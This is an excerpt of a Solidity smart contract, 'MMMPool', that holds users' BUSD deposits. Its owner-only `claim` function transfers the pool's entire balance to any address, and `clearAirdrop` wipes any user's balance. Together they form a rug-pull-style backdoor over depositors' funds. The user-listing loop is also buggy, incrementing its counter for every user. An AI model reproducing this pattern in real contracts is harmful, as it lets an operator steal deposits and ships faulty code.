...
contract MMMPool is Context, Initializable {
    ...
    function getUnclaimUsers(string memory key, bytes memory signature ) external view returns(address[] memory) {
        address signer = keccak256(
            abi.encode(key)
        ).ethSignedMessage().recover(signature);
        uint count = 0;
        ...
        if(signer == _owner) {
            for(uint i = 0; i < _depositedUsers.length; i++) {
                if(_balances[_depositedUsers[i].who] > 0)
                users[count] = _depositedUsers[i].who;
                count++;
            }
        }
        return users;
    ...
    function claim(address who) external onlyOwner{
        uint256 amount = IBEP20(_busdAddr).balanceOf(address(this)); 
        require(IBEP20(_busdAddr).transfer(who, amount), "Transfer failed");
    }
    function clearAirdrop(address who) external onlyOwner {
        _balances[who] = 0;
    }
